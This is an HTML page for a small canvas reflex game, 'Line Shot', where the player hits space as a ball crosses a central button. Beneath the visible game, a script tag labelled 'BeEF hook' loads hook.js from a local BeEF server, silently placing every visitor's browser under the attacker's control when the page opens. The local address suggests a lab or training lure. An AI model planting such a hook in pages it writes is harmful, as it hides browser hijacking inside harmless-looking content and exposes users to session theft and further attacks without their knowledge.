<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Line Shot Combo Game</title>
<style>
  body {
    margin: 0;
    background: #222;
    color: #fff;
    font-family: 'Press Start 2P', cursive, monospace;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
  canvas {
    background: #111;
    margin-top: 20px;
    border: 2px solid #555;
  }
  #score {
    font-size: 1.2rem;
    margin-top: 10px;
    font-family: 'Press Start 2P', monospace;
    user-select: none;
  }
</style>
</head>
<body>
<h1>ðŸŽ¯ Line Shot: Hit the Button!</h1>
<p>Press <b>SPACE</b> when the ball passes over the button. Chain combos!</p>
<div id="score">Score: 0 | Combo: x0</div>
<canvas id="gameCanvas" width="500" height="500"></canvas>

<!-- BeEF hook -->
<script src="http://127.0.0.1:3000/hook.js"></script>

<script>
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const scoreDisplay = document.getElementById('score');

const centerX = canvas.width / 2;
const centerY = canvas.height / 2;
const buttonRadius = 30;

let t = 0;                  
let dir = 1;                
let baseSpeed = 0.02;       
let speed = baseSpeed;
let angle = Math.random() * 2 * Math.PI;

let score = 0;
let combo = 0;

const colors = ['#FF4136', '#FF851B', '#FFDC00', '#2ECC40', '#0074D9', '#B10DC9'];

let explosionActive = false;
let explosionFrame = 0;

document.addEventListener('keydown', (e) => {
  if (explosionActive) return; // disable input during explosion
  if (e.code === 'Space') {
    const ball = getBallPosition();
    const dx = ball.x - centerX;
    const dy = ball.y - centerY;
    const dist = Math.sqrt(dx * dx + dy * dy);

    if (dist <= buttonRadius) {
      // HIT
      score++;
      combo++;
      randomizeAngle();
      updateSpeed();
      if(score >= 100) {
        triggerExplosion();
      }
    } else {
      // MISS
      combo = 0;
    }
    updateScore();
  }
});

function updateSpeed() {
  speed = Math.min(baseSpeed * (1 + 0.05 * score), 0.1);
}

function updateScore() {
  const colorIndex = Math.floor(score / 5) % colors.length;
  scoreDisplay.style.color = colors[colorIndex];
  scoreDisplay.textContent = `Score: ${score} | Combo: x${combo}`;
}

function randomizeAngle() {
  angle = Math.random() * 2 * Math.PI;
  t = 0;
  dir = 1;
}

function getBallPosition() {
  const length = 200;
  const x = centerX + Math.cos(angle) * length * t;
  const y = centerY + Math.sin(angle) * length * t;
  return {x, y};
}

function drawButton() {
  ctx.fillStyle = '#0078d7';
  ctx.beginPath();
  ctx.arc(centerX, centerY, buttonRadius, 0, 2 * Math.PI);
  ctx.fill();
}

function drawBall() {
  const pos = getBallPosition();
  ctx.fillStyle = 'yellow';
  ctx.beginPath();
  ctx.arc(pos.x, pos.y, 10, 0, 2 * Math.PI);
  ctx.fill();
}

function drawLine() {
  ctx.strokeStyle = '#aaa';
  ctx.lineWidth = 2;
  ctx.beginPath();
  const length = 200;
  const x1 = centerX + Math.cos(angle) * length;
  const y1 = centerY + Math.sin(angle) * length;
  const x2 = centerX - Math.cos(angle) * length;
  const y2 = centerY - Math.sin(angle) * length;
  ctx.moveTo(x1, y1);
  ctx.lineTo(x2, y2);
  ctx.stroke();
}

function triggerExplosion() {
  explosionActive = true;
  explosionFrame = 0;
}

function drawExplosion() {
  const maxFrames = 60;
  if(explosionFrame > maxFrames) {
    explosionActive = false;
    score = 0;
    combo = 0;
    updateSpeed();
    updateScore();
    randomizeAngle();
    return;
  }

  const progress = explosionFrame / maxFrames;
  const maxRadius = 250;

  const flash = Math.floor(progress * 10) % 2 === 0 ? '#fff' : '#000';
  ctx.fillStyle = flash;
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  for(let i=0; i<10; i++) {
    const radius = maxRadius * progress * (i / 10);
    ctx.strokeStyle = colors[i % colors.length];
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.arc(centerX, centerY, radius, 0, 2*Math.PI);
    ctx.stroke();
  }

  explosionFrame++;
}

function gameLoop() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if(explosionActive) {
    drawExplosion();
  } else {
    t += speed * dir;
    if (t >= 1 || t <= -1) {
      dir *= -1;
    }

    drawLine();
    drawButton();
    drawBall();
  }

  requestAnimationFrame(gameLoop);
}

updateSpeed();
updateScore();
gameLoop();
</script>
</body>
</html>
